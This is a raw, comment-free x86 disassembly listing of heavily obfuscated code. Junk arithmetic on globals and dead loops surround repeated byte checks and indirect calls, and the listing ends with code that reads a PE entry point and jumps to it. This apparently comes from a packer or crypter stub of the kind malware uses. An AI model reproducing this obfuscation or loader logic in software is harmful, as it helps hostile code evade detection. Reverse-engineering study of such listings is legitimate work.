  41c403:	mov    DWORD PTR ds:0x426ea9,0x55fc
  41c40d:	jne    0x41c4f5
  41c413:	and    DWORD PTR ds:0x426ef5,0x0
  41c41d:	mov    eax,ds:0x426ef5
  41c422:	inc    eax
  41c423:	mov    ds:0x426ef5,eax
  41c428:	cmp    DWORD PTR ds:0x426ef5,0xd
  41c42f:	jl     0x41c479
  41c435:	jmp    0x41c454
  41c43a:	push   0x59de
  41c43f:	push   0x39ed
  41c444:	push   0x1b7c
  41c449:	push   0x44aa
  41c44e:	call   DWORD PTR ds:0x430a1c
  41c454:	cmp    DWORD PTR ds:0x426ef5,0xc
  41c45b:	jne    0x41c46c
  41c461:	mov    eax,ds:0x426ef5
  41c466:	inc    eax
  41c467:	mov    ds:0x426ef5,eax
  41c46c:	cmp    DWORD PTR ds:0x426ef5,0x1f
  41c473:	jb     0x41c41d
  41c479:	mov    eax,DWORD PTR [esp+0x10]
  41c47d:	xor    edx,DWORD PTR ds:0x426ecd
  41c483:	mov    edx,DWORD PTR ds:0x4262c9
  41c489:	mov    edx,DWORD PTR [edx+0x198]
  41c48f:	add    DWORD PTR ds:0x426ec5,0x6b2
  41c499:	xor    eax,esi
  41c49b:	adc    DWORD PTR ds:0x426f25,0x426ef9
  41c4a5:	add    eax,ebx
  41c4a7:	and    DWORD PTR ds:0x426e85,0x426f15
  41c4b1:	mov    DWORD PTR [edx],eax
  41c4b3:	mov    eax,DWORD PTR [esp+0x10]
  41c4b7:	sub    DWORD PTR ds:0x426ec9,0x4e94
  41c4c1:	xor    eax,esi
  41c4c3:	add    eax,ebx
  41c4c5:	adc    DWORD PTR ds:0x426e81,0x426e91
  41c4cf:	mov    ds:0x426d99,eax
  41c4d4:	mov    eax,DWORD PTR [esp+0x10]
  41c4d8:	adc    DWORD PTR ds:0x426eed,0x426ef9
  41c4e2:	xor    eax,esi
  41c4e4:	add    eax,ebx
  41c4e6:	sub    DWORD PTR ds:0x426ea9,0x426e85
  41c4f0:	mov    ds:0x4263c1,eax
  41c4f5:	mov    eax,ds:0x4262c9
  41c4fa:	sbb    DWORD PTR ds:0x426f05,0x67a3
  41c504:	mov    eax,DWORD PTR [eax+0x18c]
  41c50a:	adc    DWORD PTR ds:0x426e91,0x180f
  41c514:	mov    eax,DWORD PTR [eax]
  41c516:	sbb    DWORD PTR ds:0x426eb1,0x4112
  41c520:	mov    DWORD PTR [esp+0x48],eax
  41c524:	adc    DWORD PTR ds:0x426eb9,edi
  41c52a:	mov    eax,0xf89c85b9
  41c52f:	mov    DWORD PTR [esp+0x38],eax
  41c533:	inc    DWORD PTR ds:0x426e8d
  41c539:	mov    DWORD PTR [esp+0x38],eax
  41c53d:	xor    DWORD PTR ds:0x426f11,0x441e
  41c547:	mov    DWORD PTR [esp+0x38],eax
  41c54b:	mov    DWORD PTR [esp+0x38],ecx
  41c54f:	neg    DWORD PTR ds:0x426f25
  41c555:	mov    DWORD PTR [esp+0x28],eax
  41c559:	movzx  eax,WORD PTR ds:0x426ec5
  41c560:	sbb    eax,DWORD PTR ds:0x426ee1
  41c566:	mov    ds:0x426ec5,eax
  41c56b:	mov    DWORD PTR [esp+0x28],0xf89c85bd
  41c573:	sbb    DWORD PTR ds:0x426ef9,0x58a6
  41c57d:	mov    eax,DWORD PTR [esp+0x10]
  41c581:	xor    eax,esi
  41c583:	add    eax,ebx
  41c585:	jmp    0x41c7a3
  41c58a:	mov    DWORD PTR ds:0x426eb5,0x6384
  41c594:	mov    al,ds:0x42647f
  41c599:	mov    DWORD PTR ds:0x426f01,0x6aa0
  41c5a3:	cmp    al,BYTE PTR ds:0x42648a
  41c5a9:	mov    DWORD PTR ds:0x426e85,0x34fb
  41c5b3:	jne    0x41c211
  41c5b9:	mov    DWORD PTR ds:0x426e99,0x7ac4
  41c5c3:	mov    al,ds:0x42649c
  41c5c8:	cmp    al,BYTE PTR ds:0x4264ab
  41c5ce:	mov    DWORD PTR ds:0x426e99,0x679f
  41c5d8:	jne    0x41c211
  41c5de:	push   0x4264b5
  41c5e3:	or     DWORD PTR ds:0x426e99,0x4d97
  41c5ed:	push   0x4264c5
  41c5f2:	call   edi
  41c5f4:	test   eax,eax
  41c5f6:	mov    DWORD PTR ds:0x426ecd,0x4160
  41c600:	je     0x41c211
  41c606:	mov    DWORD PTR ds:0x426ec5,0x29ef
  41c610:	mov    al,ds:0x4264db
  41c615:	cmp    al,BYTE PTR ds:0x4264e6
  41c61b:	jne    0x41c211
  41c621:	mov    al,ds:0x4264f8
  41c626:	mov    DWORD PTR ds:0x426ecd,0x6d7c
  41c630:	cmp    al,BYTE PTR ds:0x426507
  41c636:	mov    DWORD PTR ds:0x426ee5,0x7eb8
  41c640:	jne    0x41c211
  41c646:	sub    DWORD PTR ds:0x426ef9,0x282b
  41c650:	push   0x426511
  41c655:	push   0x426521
  41c65a:	call   edi
  41c65c:	sbb    DWORD PTR ds:0x426edd,0x426e9d
  41c666:	test   eax,eax
  41c668:	mov    DWORD PTR ds:0x426ee9,0x3f4b
  41c672:	je     0x41c211
  41c678:	and    DWORD PTR ds:0x426e91,0x0
  41c682:	xor    eax,eax
  41c684:	xor    eax,DWORD PTR ds:0x426e91
  41c68a:	inc    eax
  41c68b:	mov    ds:0x426e91,eax
  41c690:	cmp    DWORD PTR ds:0x426e91,0x9
  41c697:	ja     0x41c6d0
  41c69d:	jmp    0x41c6a8
  41c6a2:	call   DWORD PTR ds:0x430a20
  41c6a8:	cmp    DWORD PTR ds:0x426e91,0x8
  41c6af:	jne    0x41c6c3
  41c6b5:	xor    eax,eax
  41c6b7:	add    eax,DWORD PTR ds:0x426e91
  41c6bd:	inc    eax
  41c6be:	mov    ds:0x426e91,eax
  41c6c3:	cmp    DWORD PTR ds:0x426e91,0x1a
  41c6ca:	jb     0x41c682
  41c6d0:	mov    eax,DWORD PTR [esp+0x1c]
  41c6d4:	adc    DWORD PTR ds:0x426f01,ecx
  41c6da:	mov    ecx,DWORD PTR [esp+0x28]
  41c6de:	xor    eax,esi
  41c6e0:	lea    eax,[eax+ecx*1+0x3272fa]
  41c6e7:	push   eax
  41c6e8:	xor    eax,DWORD PTR ds:0x426eb1
  41c6ee:	mov    eax,DWORD PTR [esp+0x3c]
  41c6f2:	adc    DWORD PTR ds:0x426ec1,0x19c6
  41c6fc:	xor    eax,esi
  41c6fe:	sbb    DWORD PTR ds:0x426ec5,0x426ea9
  41c708:	lea    eax,[ebp+eax*1+0x327302]
  41c70f:	xor    DWORD PTR ds:0x426ec1,0x34b0
  41c719:	push   eax
  41c71a:	xor    eax,DWORD PTR ds:0x426e99
  41c720:	mov    eax,ds:0x4262c9
  41c725:	adc    DWORD PTR ds:0x426ea5,0x426f09
  41c72f:	push   DWORD PTR [eax+0x1bc]
  41c735:	adc    DWORD PTR ds:0x426f0d,0x426ea5
  41c73f:	call   0x41d27f
  41c744:	mov    eax,DWORD PTR [esp+0x1c]
  41c748:	mov    ecx,DWORD PTR [esp+0x28]
  41c74c:	xor    eax,esi
  41c74e:	and    DWORD PTR ds:0x426e85,0x0
  41c758:	mov    edx,DWORD PTR ds:0x426e85
  41c75e:	inc    edx
  41c75f:	mov    DWORD PTR ds:0x426e85,edx
  41c765:	cmp    DWORD PTR ds:0x426e85,0x22
  41c76c:	jl     0x41c79c
  41c772:	jmp    0x41c78f
  41c777:	push   0x426000
  41c77c:	push   0x29cf
  41c781:	push   0x6715
  41c786:	push   DWORD PTR [ebp-0x18]
  41c789:	call   DWORD PTR ds:0x430a24
  41c78f:	cmp    DWORD PTR ds:0x426e85,0x1b
  41c796:	jb     0x41c758
  41c79c:	lea    eax,[ecx+eax*1+0x3272fa]
  41c7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41c7a7:	mov    edx,DWORD PTR [esp+0x1c]
  41c7ab:	xor    edx,esi
  41c7ad:	sbb    DWORD PTR ds:0x426f29,0x426e8d
  41c7b7:	xor    ecx,esi
  41c7b9:	add    ecx,edx
  41c7bb:	sbb    edx,DWORD PTR ds:0x426f1d
  41c7c1:	mov    edx,DWORD PTR [esp+0x1c]
  41c7c5:	adc    DWORD PTR ds:0x426ef9,0x135a
  41c7cf:	xor    edx,esi
  41c7d1:	mov    DWORD PTR ds:0x426ee5,0x2979
  41c7db:	lea    ecx,[ecx+edx*1+0x9758ee]
  41c7e2:	mov    DWORD PTR ds:0x426f2d,0x689
  41c7ec:	mov    DWORD PTR [esp+0x28],eax
  41c7f0:	cmp    eax,ecx
  41c7f2:	mov    DWORD PTR ds:0x426efd,0x13db
  41c7fc:	jbe    0x41c58a
  41c802:	mov    eax,DWORD PTR [ebp+0xc]
  41c805:	mov    ds:0x42614d,eax
  41c80a:	and    DWORD PTR ds:0x426eb1,0x0
  41c814:	jmp    0x41c824
  41c819:	mov    eax,ds:0x426eb1
  41c81e:	inc    eax
  41c81f:	mov    ds:0x426eb1,eax
  41c824:	cmp    DWORD PTR ds:0x426eb1,0x19
  41c82b:	jae    0x41c851
  41c831:	cmp    DWORD PTR ds:0x426eb1,0x20
  41c838:	jl     0x41c851
  41c83e:	jmp    0x41c84c
  41c843:	push   DWORD PTR [ebp-0xc]
  41c846:	call   DWORD PTR ds:0x430a28
  41c84c:	jmp    0x41c819
  41c851:	mov    eax,DWORD PTR [ebp+0x10]
  41c854:	mov    ds:0x4263a9,eax
  41c859:	mov    ecx,DWORD PTR ds:0x42af71
  41c85f:	mov    eax,ds:0x42af7d
  41c864:	sub    eax,ecx
  41c866:	xor    ecx,DWORD PTR [ecx+eax*1]
  41c869:	mov    eax,ds:0x42614d
  41c86e:	inc    ecx
  41c86f:	mov    ecx,DWORD PTR [esp+0x44]
  41c873:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c87d:	sub    eax,ebx
  41c87f:	sub    DWORD PTR ds:0x426eed,0x426f05
  41c889:	xor    eax,esi
  41c88b:	mov    DWORD PTR [ecx],eax
  41c88d:	mov    DWORD PTR ds:0x426ea1,0x1d16
  41c897:	lea    eax,[esp+0x20]
  41c89b:	mov    DWORD PTR ds:0x426f1d,0x743e
  41c8a5:	mov    DWORD PTR [esp+0x4c],eax
  41c8a9:	mov    DWORD PTR ds:0x426eb5,0x1725
  41c8b3:	lea    eax,[ebp+0x4]
  41c8b6:	mov    DWORD PTR ds:0x426f0d,0x331f
  41c8c0:	mov    DWORD PTR [esp+0x20],eax
  41c8c4:	mov    DWORD PTR ds:0x426ea1,0x4fd1
  41c8ce:	mov    al,ds:0x426537
  41c8d3:	cmp    al,BYTE PTR ds:0x426542
  41c8d9:	jne    0x41c211
  41c8df:	mov    al,ds:0x426554
  41c8e4:	mov    DWORD PTR ds:0x426e99,0x22c3
  41c8ee:	cmp    al,BYTE PTR ds:0x426563
  41c8f4:	mov    DWORD PTR ds:0x426f21,0x5c30
  41c8fe:	jne    0x41c211
  41c904:	sub    DWORD PTR ds:0x426eb5,0x53da
  41c90e:	push   0x42656d
  41c913:	sbb    DWORD PTR ds:0x426f0d,0x426f15
  41c91d:	push   0x42657d
  41c922:	sbb    DWORD PTR ds:0x426e81,0x426e95
  41c92c:	call   edi
  41c92e:	test   eax,eax
  41c930:	mov    DWORD PTR ds:0x426f09,0x3f7d
  41c93a:	je     0x41c211
  41c940:	mov    al,ds:0x426593
  41c945:	mov    DWORD PTR ds:0x426f09,0x7a71
  41c94f:	cmp    al,BYTE PTR ds:0x42659e
  41c955:	mov    DWORD PTR ds:0x426f21,0x448e
  41c95f:	jne    0x41c211
  41c965:	mov    al,ds:0x4265b0
  41c96a:	cmp    al,BYTE PTR ds:0x4265bf
  41c970:	jne    0x41c211
  41c976:	push   0x4265c9
  41c97b:	add    DWORD PTR ds:0x426eb9,0x4508
  41c985:	push   0x4265d9
  41c98a:	call   edi
  41c98c:	test   eax,eax
  41c98e:	je     0x41c211
  41c994:	mov    DWORD PTR ds:0x426ed1,0x4635
  41c99e:	mov    al,ds:0x4265ef
  41c9a3:	mov    DWORD PTR ds:0x426f11,0x2d29
  41c9ad:	cmp    al,BYTE PTR ds:0x4265fa
  41c9b3:	mov    DWORD PTR ds:0x426f1d,0x5285
  41c9bd:	jne    0x41c211
  41c9c3:	mov    DWORD PTR ds:0x426ecd,0x17c5
  41c9cd:	mov    al,ds:0x42660c
  41c9d2:	mov    DWORD PTR ds:0x426ecd,0x1f4b
  41c9dc:	cmp    al,BYTE PTR ds:0x42661b
  41c9e2:	jne    0x41c211
  41c9e8:	push   0x426625
  41c9ed:	adc    DWORD PTR ds:0x426ef1,0x426ee5
  41c9f7:	push   0x426635
  41c9fc:	call   edi
  41c9fe:	adc    DWORD PTR ds:0x426edd,0x72d
  41ca08:	test   eax,eax
  41ca0a:	je     0x41c211
  41ca10:	mov    DWORD PTR ds:0x426ed9,0x3296
  41ca1a:	mov    al,ds:0x42664b
  41ca1f:	mov    DWORD PTR ds:0x426e91,0x9e5
  41ca29:	cmp    al,BYTE PTR ds:0x426656
  41ca2f:	mov    DWORD PTR ds:0x426ee1,0x4731
  41ca39:	jne    0x41c211
  41ca3f:	mov    al,ds:0x426668
  41ca44:	cmp    al,BYTE PTR ds:0x426677
  41ca4a:	jne    0x41c211
  41ca50:	xor    DWORD PTR ds:0x426e85,0x78df
  41ca5a:	push   0x426681
  41ca5f:	push   0x426691
  41ca64:	call   edi
  41ca66:	test   eax,eax
  41ca68:	je     0x41c211
  41ca6e:	mov    DWORD PTR ds:0x426efd,0x48d1
  41ca78:	mov    al,ds:0x4266a7
  41ca7d:	mov    DWORD PTR ds:0x426eb1,0x58ba
  41ca87:	cmp    al,BYTE PTR ds:0x4266b2
  41ca8d:	jne    0x41c211
  41ca93:	mov    al,ds:0x4266c4
  41ca98:	mov    DWORD PTR ds:0x426ea9,0x5172
  41caa2:	cmp    al,BYTE PTR ds:0x4266d3
  41caa8:	mov    DWORD PTR ds:0x426ecd,0x25dc
  41cab2:	jne    0x41c211
  41cab8:	add    DWORD PTR ds:0x426ef5,0x426ea9
  41cac2:	push   0x4266dd
  41cac7:	mov    DWORD PTR ds:0x426f1d,0x534b
  41cad1:	push   0x4266ed
  41cad6:	xor    DWORD PTR ds:0x426e8d,0x426e89
  41cae0:	call   edi
  41cae2:	test   eax,eax
  41cae4:	mov    DWORD PTR ds:0x426f09,0x17e9
  41caee:	je     0x41c211
  41caf4:	mov    DWORD PTR ds:0x426f15,0x546d
  41cafe:	mov    al,ds:0x426703
  41cb03:	mov    DWORD PTR ds:0x426ec9,0x6884
  41cb0d:	cmp    al,BYTE PTR ds:0x42670e
  41cb13:	mov    DWORD PTR ds:0x426e95,0x724e
  41cb1d:	jne    0x41c211
  41cb23:	mov    DWORD PTR ds:0x426eb1,0x7b3e
  41cb2d:	mov    al,ds:0x426720
  41cb32:	mov    DWORD PTR ds:0x426ea9,0xb8a
  41cb3c:	cmp    al,BYTE PTR ds:0x42672f
  41cb42:	mov    DWORD PTR ds:0x426ea5,0xfff
  41cb4c:	jne    0x41c211
  41cb52:	adc    DWORD PTR ds:0x426e81,0x426ed5
  41cb5c:	push   0x426739
  41cb61:	push   0x426749
  41cb66:	call   edi
  41cb68:	mov    DWORD PTR ds:0x426eb1,0x513e
  41cb72:	test   eax,eax
  41cb74:	je     0x41c211
  41cb7a:	mov    al,ds:0x42675f
  41cb7f:	mov    DWORD PTR ds:0x426e8d,0x24d0
  41cb89:	cmp    al,BYTE PTR ds:0x42676a
  41cb8f:	jne    0x41c211
  41cb95:	mov    DWORD PTR ds:0x426eb1,0x7a1a
  41cb9f:	mov    al,ds:0x42677c
  41cba4:	mov    DWORD PTR ds:0x426ef5,0x1244
  41cbae:	cmp    al,BYTE PTR ds:0x42678b
  41cbb4:	mov    DWORD PTR ds:0x426ed1,0x3050
  41cbbe:	jne    0x41c211
  41cbc4:	sub    DWORD PTR ds:0x426ee1,0x426f25
  41cbce:	push   0x426795
  41cbd3:	add    DWORD PTR ds:0x426f11,0x40a8
  41cbdd:	push   0x4267a5
  41cbe2:	sub    DWORD PTR ds:0x426ef9,0x426e9d
  41cbec:	call   edi
  41cbee:	adc    DWORD PTR ds:0x426e99,0x426f0d
  41cbf8:	test   eax,eax
  41cbfa:	je     0x41c211
  41cc00:	mov    al,ds:0x4267bb
  41cc05:	mov    DWORD PTR ds:0x426f05,0xc7b
  41cc0f:	cmp    al,BYTE PTR ds:0x4267c6
  41cc15:	mov    DWORD PTR ds:0x426eb9,0x70f1
  41cc1f:	jne    0x41c211
  41cc25:	mov    al,ds:0x4267d8
  41cc2a:	mov    DWORD PTR ds:0x426f09,0x320
  41cc34:	cmp    al,BYTE PTR ds:0x4267e7
  41cc3a:	mov    DWORD PTR ds:0x426ee1,0xc80
  41cc44:	jne    0x41c211
  41cc4a:	sbb    DWORD PTR ds:0x426e85,0x426ea9
  41cc54:	push   0x4267f1
  41cc59:	adc    DWORD PTR ds:0x426f21,0x426f09
  41cc63:	push   0x426801
  41cc68:	call   edi
  41cc6a:	test   eax,eax
  41cc6c:	mov    DWORD PTR ds:0x426e9d,0x1d82
  41cc76:	je     0x41c211
  41cc7c:	mov    DWORD PTR ds:0x426e8d,0x4c1f
  41cc86:	mov    al,ds:0x426817
  41cc8b:	mov    DWORD PTR ds:0x426ebd,0x2305
  41cc95:	cmp    al,BYTE PTR ds:0x426822
  41cc9b:	mov    DWORD PTR ds:0x426e85,0x52ee
  41cca5:	jne    0x41c211
  41ccab:	mov    DWORD PTR ds:0x426eed,0x1308
  41ccb5:	mov    al,ds:0x426834
  41ccba:	cmp    al,BYTE PTR ds:0x426843
  41ccc0:	mov    DWORD PTR ds:0x426ea9,0x1ac4
  41ccca:	jne    0x41c211
  41ccd0:	push   0x42684d
  41ccd5:	push   0x42685d
  41ccda:	call   edi
  41ccdc:	xor    DWORD PTR ds:0x426eb5,0x537b
  41cce6:	test   eax,eax
  41cce8:	mov    DWORD PTR ds:0x426f2d,0x4412
  41ccf2:	je     0x41c211
  41ccf8:	mov    al,ds:0x426873
  41ccfd:	mov    DWORD PTR ds:0x426eb1,0x52c5
  41cd07:	cmp    al,BYTE PTR ds:0x42687e
  41cd0d:	mov    DWORD PTR ds:0x426f01,0x16df
  41cd17:	jne    0x41c211
  41cd1d:	mov    DWORD PTR ds:0x426ee1,0xd56
  41cd27:	mov    al,ds:0x426890
  41cd2c:	mov    DWORD PTR ds:0x426ed1,0x624d
  41cd36:	cmp    al,BYTE PTR ds:0x42689f
  41cd3c:	mov    DWORD PTR ds:0x426e95,0x6fa7
  41cd46:	jne    0x41c211
  41cd4c:	push   0x4268a9
  41cd51:	push   0x4268b9
  41cd56:	call   edi
  41cd58:	test   eax,eax
  41cd5a:	je     0x41c211
  41cd60:	mov    al,ds:0x4268cf
  41cd65:	mov    DWORD PTR ds:0x426ea5,0x6b61
  41cd6f:	cmp    al,BYTE PTR ds:0x4268da
  41cd75:	mov    DWORD PTR ds:0x426ef1,0x607d
  41cd7f:	jne    0x41c211
  41cd85:	mov    al,ds:0x4268ec
  41cd8a:	mov    DWORD PTR ds:0x426f11,0x76ce
  41cd94:	cmp    al,BYTE PTR ds:0x4268fb
  41cd9a:	mov    DWORD PTR ds:0x426ea9,0x7be9
  41cda4:	jne    0x41c211
  41cdaa:	push   0x426905
  41cdaf:	xor    DWORD PTR ds:0x426e89,0x5d69
  41cdb9:	push   0x426915
  41cdbe:	call   edi
  41cdc0:	test   eax,eax
  41cdc2:	je     0x41c211
  41cdc8:	mov    al,ds:0x42692b
  41cdcd:	mov    DWORD PTR ds:0x426eed,0x2af5
  41cdd7:	cmp    al,BYTE PTR ds:0x426936
  41cddd:	mov    DWORD PTR ds:0x426ed9,0x56c9
  41cde7:	jne    0x41c211
  41cded:	mov    DWORD PTR ds:0x426f09,0x21f5
  41cdf7:	mov    al,ds:0x426948
  41cdfc:	cmp    al,BYTE PTR ds:0x426957
  41ce02:	jne    0x41c211
  41ce08:	push   0x426961
  41ce0d:	sub    DWORD PTR ds:0x426ef1,0x426f19
  41ce17:	push   0x426971
  41ce1c:	call   edi
  41ce1e:	or     DWORD PTR ds:0x426f11,0x426ea1
  41ce28:	test   eax,eax
  41ce2a:	je     0x41c211
  41ce30:	mov    DWORD PTR ds:0x426f1d,0x33c9
  41ce3a:	mov    al,ds:0x426987
  41ce3f:	cmp    al,BYTE PTR ds:0x426992
  41ce45:	jne    0x41c211
  41ce4b:	mov    al,ds:0x4269a4
  41ce50:	cmp    al,BYTE PTR ds:0x4269b3
  41ce56:	jne    0x41c211
  41ce5c:	push   0x4269bd
  41ce61:	push   0x4269cd
  41ce66:	call   edi
  41ce68:	test   eax,eax
  41ce6a:	je     0x41c211
  41ce70:	mov    al,ds:0x4269e3
  41ce75:	cmp    al,BYTE PTR ds:0x4269ee
  41ce7b:	jne    0x41c211
  41ce81:	mov    al,ds:0x426a00
  41ce86:	cmp    al,BYTE PTR ds:0x426a0f
  41ce8c:	jne    0x41c211
  41ce92:	push   0x426a19
  41ce97:	push   0x426a29
  41ce9c:	call   edi
  41ce9e:	test   eax,eax
  41cea0:	je     0x41c211
  41cea6:	mov    al,ds:0x426a3f
  41ceab:	cmp    al,BYTE PTR ds:0x426a4a
  41ceb1:	jne    0x41c211
  41ceb7:	mov    al,ds:0x426a5c
  41cebc:	cmp    al,BYTE PTR ds:0x426a6b
  41cec2:	jne    0x41c211
  41cec8:	push   0x426a75
  41cecd:	push   0x426a85
  41ced2:	call   edi
  41ced4:	test   eax,eax
  41ced6:	je     0x41c211
  41cedc:	mov    al,ds:0x426a9b
  41cee1:	cmp    al,BYTE PTR ds:0x426aa6
  41cee7:	jne    0x41c211
  41ceed:	mov    al,ds:0x426ab8
  41cef2:	cmp    al,BYTE PTR ds:0x426ac7
  41cef8:	jne    0x41c211
  41cefe:	push   0x426ad1
  41cf03:	push   0x426ae1
  41cf08:	call   edi
  41cf0a:	test   eax,eax
  41cf0c:	je     0x41c211
  41cf12:	mov    al,ds:0x426af7
  41cf17:	cmp    al,BYTE PTR ds:0x426b02
  41cf1d:	jne    0x41c211
  41cf23:	mov    al,ds:0x426b14
  41cf28:	cmp    al,BYTE PTR ds:0x426b23
  41cf2e:	jne    0x41c211
  41cf34:	push   0x426b2d
  41cf39:	push   0x426b3d
  41cf3e:	call   edi
  41cf40:	test   eax,eax
  41cf42:	je     0x41c211
  41cf48:	mov    al,ds:0x426b53
  41cf4d:	cmp    al,BYTE PTR ds:0x426b5e
  41cf53:	jne    0x41c211
  41cf59:	mov    al,ds:0x426b70
  41cf5e:	cmp    al,BYTE PTR ds:0x426b7f
  41cf64:	jne    0x41c211
  41cf6a:	push   0x426b89
  41cf6f:	push   0x426b99
  41cf74:	call   edi
  41cf76:	test   eax,eax
  41cf78:	je     0x41c211
  41cf7e:	mov    al,ds:0x426baf
  41cf83:	cmp    al,BYTE PTR ds:0x426bba
  41cf89:	jne    0x41c211
  41cf8f:	mov    al,ds:0x426bcc
  41cf94:	cmp    al,BYTE PTR ds:0x426bdb
  41cf9a:	jne    0x41c211
  41cfa0:	push   0x426be5
  41cfa5:	push   0x426bf5
  41cfaa:	call   edi
  41cfac:	test   eax,eax
  41cfae:	je     0x41c211
  41cfb4:	mov    al,ds:0x426c0b
  41cfb9:	cmp    al,BYTE PTR ds:0x426c16
  41cfbf:	jne    0x41c211
  41cfc5:	mov    al,ds:0x426c28
  41cfca:	cmp    al,BYTE PTR ds:0x426c37
  41cfd0:	jne    0x41c211
  41cfd6:	push   0x426c41
  41cfdb:	push   0x426c51
  41cfe0:	call   edi
  41cfe2:	test   eax,eax
  41cfe4:	je     0x41c211
  41cfea:	mov    al,ds:0x426c67
  41cfef:	cmp    al,BYTE PTR ds:0x426c72
  41cff5:	jne    0x41c211
  41cffb:	mov    al,ds:0x426c84
  41d000:	cmp    al,BYTE PTR ds:0x426c93
  41d006:	jne    0x41c211
  41d00c:	push   0x426c9d
  41d011:	push   0x426cad
  41d016:	call   edi
  41d018:	test   eax,eax
  41d01a:	je     0x41c211
  41d020:	mov    eax,DWORD PTR [esp+0x34]
  41d024:	cmp    eax,0xf89c85b4
  41d029:	je     0x41d088
  41d02f:	mov    eax,DWORD PTR [esp+0x10]
  41d033:	mov    ecx,DWORD PTR [esp+0x30]
  41d037:	xor    eax,esi
  41d039:	add    eax,ebx
  41d03b:	cmp    eax,ecx
  41d03d:	je     0x41d088
  41d043:	mov    eax,ds:0x4262c9
  41d048:	mov    eax,DWORD PTR [eax+0x194]
  41d04e:	mov    ecx,DWORD PTR [eax]
  41d050:	mov    eax,DWORD PTR [ecx+0x3c]
  41d053:	push   DWORD PTR ds:0x4263a9
  41d059:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41d05d:	push   DWORD PTR ds:0x42614d
  41d063:	add    eax,ecx
  41d065:	mov    ecx,DWORD PTR ds:0x4262c9
  41d06b:	mov    ecx,DWORD PTR [ecx+0x194]
  41d071:	push   DWORD PTR [ecx]
  41d073:	call   eax
  41d075:	mov    ecx,DWORD PTR ds:0x4262c9
  41d07b:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d081:	mov    DWORD PTR [ecx],eax
  41d083:	jmp    0x41d259
  41d088:	mov    eax,DWORD PTR [esp+0x10]
  41d08c:	mov    ecx,DWORD PTR [esp+0x48]
  41d090:	xor    eax,esi
  41d092:	add    eax,ebx
  41d094:	cmp    eax,ecx
  41d096:	jne    0x41d101
  41d09c:	mov    eax,DWORD PTR [esp+0x10]
  41d0a0:	mov    ecx,DWORD PTR ds:0x4262c9
  41d0a6:	mov    ecx,DWORD PTR [ecx+0x198]
  41d0ac:	xor    eax,esi
  41d0ae:	add    eax,ebx
  41d0b0:	cmp    eax,DWORD PTR [ecx]
  41d0b2:	jne    0x41d0da
  41d0b8:	mov    eax,DWORD PTR [esp+0x10]
  41d0bc:	push   0xffffffff
  41d0be:	push   0x70941f8a
  41d0c3:	xor    eax,esi
  41d0c5:	add    eax,ebx
  41d0c7:	push   eax
  41d0c8:	push   0xf89c85b9
  41d0cd:	push   DWORD PTR [esp+0x2c]
  41d0d1:	push   DWORD PTR [esp+0x24]
  41d0d5:	call   0x417355
  41d0da:	push   DWORD PTR [esp+0x1c]
  41d0de:	push   DWORD PTR [esp+0x14]
  41d0e2:	call   0x401000
  41d0e7:	mov    eax,DWORD PTR [esp+0x10]
  41d0eb:	xor    eax,esi
  41d0ed:	add    eax,ebx
  41d0ef:	mov    ds:0x426355,eax
  41d0f4:	mov    eax,DWORD PTR [esp+0x10]
  41d0f8:	xor    eax,esi
  41d0fa:	add    eax,ebx
  41d0fc:	mov    ds:0x42634d,eax
  41d101:	mov    eax,DWORD PTR [esp+0x20]
  41d105:	test   eax,eax
  41d107:	je     0x41d259
  41d10d:	mov    DWORD PTR [esp+0x50],0xf152c3c
  41d115:	mov    DWORD PTR [esp+0x54],0x712edcf
  41d11d:	mov    DWORD PTR [esp+0x58],0x373fc2d
  41d125:	mov    DWORD PTR [esp+0x5c],0x72670add
  41d12d:	call   0x416fa9
  41d132:	mov    eax,DWORD PTR [esp+0x24]
  41d136:	mov    eax,DWORD PTR [esp+0x1c]
  41d13a:	mov    DWORD PTR [esp+0x44],eax
  41d13e:	mov    eax,DWORD PTR [esp+0x10]
  41d142:	mov    DWORD PTR [esp+0x1c],eax
  41d146:	mov    eax,eax
  41d148:	mov    eax,ds:0x4262c9
  41d14d:	mov    ecx,DWORD PTR [eax+0x1c0]
  41d153:	mov    edx,DWORD PTR [ecx]
  41d155:	and    DWORD PTR [esp+0x3c],0x0
  41d15a:	mov    edi,0xfabdbecd
  41d15f:	add    edx,edi
  41d161:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d166:	mov    ecx,0x8a29a147
  41d16b:	xor    edx,ecx
  41d16d:	mov    DWORD PTR [esp+0x28],edx
  41d171:	mov    edx,DWORD PTR [esp+0x3c]
  41d175:	xor    edx,0x0
  41d178:	cmp    DWORD PTR [esp+0x28],0x70941f89
  41d180:	mov    DWORD PTR [esp+0x2c],edx
  41d184:	jne    0x41d193
  41d18a:	cmp    edx,0xffffffff
  41d18d:	je     0x41d1fc
  41d193:	mov    eax,DWORD PTR [eax+0x1c8]
  41d199:	mov    eax,DWORD PTR [eax]
  41d19b:	cdq    
  41d19c:	add    eax,edi
  41d19e:	adc    edx,0xffffffff
  41d1a1:	and    DWORD PTR [esp+0x3c],0x0
  41d1a6:	xor    edx,0x0
  41d1a9:	mov    DWORD PTR [esp+0x14],edx
  41d1ad:	mov    edx,DWORD PTR [esp+0x1c]
  41d1b1:	mov    DWORD PTR [esp+0x38],edx
  41d1b5:	xor    eax,ecx
  41d1b7:	add    DWORD PTR [esp+0x38],edi
  41d1bb:	mov    edx,DWORD PTR [esp+0x38]
  41d1bf:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d1c4:	xor    edx,ecx
  41d1c6:	mov    DWORD PTR [esp+0x28],edx
  41d1ca:	mov    edx,DWORD PTR [esp+0x3c]
  41d1ce:	xor    edx,0x0
  41d1d1:	mov    DWORD PTR [esp+0x2c],edx
  41d1d5:	cmp    DWORD PTR [esp+0x28],eax
  41d1d9:	jne    0x41d1eb
  41d1df:	mov    eax,DWORD PTR [esp+0x14]
  41d1e3:	cmp    edx,eax
  41d1e5:	je     0x41d1fc
  41d1eb:	mov    eax,DWORD PTR [esp+0x1c]
  41d1ef:	add    eax,DWORD PTR [esp+0x44]
  41d1f3:	mov    DWORD PTR [esp+0x1c],eax
  41d1f7:	jmp    0x41d259
  41d1fc:	mov    eax,ds:0x42634d
  41d201:	mov    edx,DWORD PTR ds:0x426355
  41d207:	xor    eax,edx
  41d209:	mov    ds:0x42634d,eax
  41d20e:	mov    edx,DWORD PTR ds:0x42634d
  41d214:	mov    eax,DWORD PTR [esp+0x20]
  41d218:	add    DWORD PTR [eax],edx
